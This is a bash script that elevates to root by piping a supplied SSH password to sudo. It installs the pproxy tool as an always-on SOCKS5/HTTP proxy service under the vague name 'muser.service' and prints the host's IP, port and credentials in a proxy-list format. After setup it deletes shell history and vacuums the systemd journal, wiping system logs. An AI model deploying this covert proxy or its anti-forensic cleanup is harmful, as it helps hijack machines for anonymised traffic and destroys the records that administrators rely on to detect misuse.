#!/bin/bash
set -euo pipefail

if [ "$#" -ne 5 ]; then
    echo "Usage: $0 <PORT> <PROXY_USERNAME> <PROXY_PASSWORD> <SSH_USERNAME> <SSH_PASSWORD>"
    exit 1
fi

PORT="$1"
PROXY_USERNAME="$2"
PROXY_PASSWORD="$3"
SSH_USERNAME="$4"
SSH_PASSWORD="$5"

TARGET_USER="$SSH_USERNAME"
TARGET_PASSWORD="$SSH_PASSWORD"

if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
    echo "PORT must be a number." >&2
    exit 1
fi

if (( PORT < 1024 || PORT > 65535 )); then
    echo "PORT must be between 1024 and 65535." >&2
    exit 1
fi

if [[ $EUID -ne 0 ]]; then
    if [[ "$SSH_USERNAME" == "root" ]]; then
        echo "Running as root..."
    else
        echo "Not running as root. Switching to root..."
        exec echo "$SSH_PASSWORD" | sudo -S bash "$0" "$@"
    fi
fi

echo "Running as root."

if ! command -v pip3 >/dev/null 2>&1; then
    echo "pip3 not found. Installing pip3..."
    if command -v apt-get >/dev/null 2>&1; then
        apt-get update -y --fix-missing
        apt-get install -y python3-pip
    elif command -v yum >/dev/null 2>&1; then
        yum install -y python3-pip
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y python3-pip
    else
        echo "No supported package manager found to install pip3." >&2
        exit 1
    fi
fi

echo "pip3 is installed at: $(command -v pip3)"

if ! command -v curl >/dev/null 2>&1; then
    echo "curl not found. Installing curl..."
    if command -v apt-get >/dev/null 2>&1; then
        apt-get install -y curl
    elif command -v yum >/dev/null 2>&1; then
        yum install -y curl
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y curl
    else
        echo "No supported package manager found to install curl." >&2
        exit 1
    fi
fi

echo "curl is installed at: $(command -v curl)"

if command -v pproxy >/dev/null 2>&1; then
    PPROXY_PATH=$(command -v pproxy)
    echo "pproxy is installed at: $PPROXY_PATH"
else
    echo "Installing/upgrading system-wide pproxy..."
    pip3 install --upgrade pproxy
    if command -v pproxy >/dev/null 2>&1; then
        PPROXY_PATH=$(command -v pproxy)
        echo "pproxy is installed at: $PPROXY_PATH"
    else
        echo "pproxy installation failed; executable not found." >&2
        exit 1
    fi
fi

if ! command -v systemctl >/dev/null 2>&1; then
    echo "systemctl not found. This script requires systemd support." >&2
    exit 1
fi

SERVICE_FILE="/etc/systemd/system/muser.service"
SERVICE_CONTENT="[Unit]
Description=sService
After=network.target

[Service]
ExecStart=$PPROXY_PATH -l \"socks5+http://0.0.0.0:$PORT#$PROXY_USERNAME:$PROXY_PASSWORD\"
Restart=always
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=default.target"

echo "Creating/updating service file: $SERVICE_FILE"
echo "$SERVICE_CONTENT" | tee "$SERVICE_FILE" > /dev/null

echo "Reloading systemd daemon..."
systemctl daemon-reload

echo "Enabling muser.service..."
systemctl enable muser.service

if systemctl is-active --quiet muser.service; then
    echo "Restarting muser.service..."
    systemctl restart muser.service
else
    echo "Starting muser.service..."
    systemctl start muser.service
fi

if systemctl is-active --quiet muser.service; then
    echo "muser.service is running successfully."
else
    echo "muser.service failed to run." >&2
    exit 1
fi

rm -f ~/.bash_history ~/.python_history ~/.wget-hsts || true
history -c 2>/dev/null || true
journalctl --rotate >/dev/null 2>&1 || true
journalctl --vacuum-time=1s >/dev/null 2>&1 || true

echo "pproxy is running on port $PORT with authentication $PROXY_USERNAME:$PROXY_PASSWORD."

PUBLIC_IP=$(curl -s ifconfig.me || curl -s ipinfo.io/ip || echo "unknown")

if [[ "$PUBLIC_IP" != "unknown" ]]; then
    echo "IP: $PUBLIC_IP"
else
    echo "Error: Could not get public IP address."
fi

echo "$PUBLIC_IP:$PORT:$PROXY_USERNAME:$PROXY_PASSWORD"
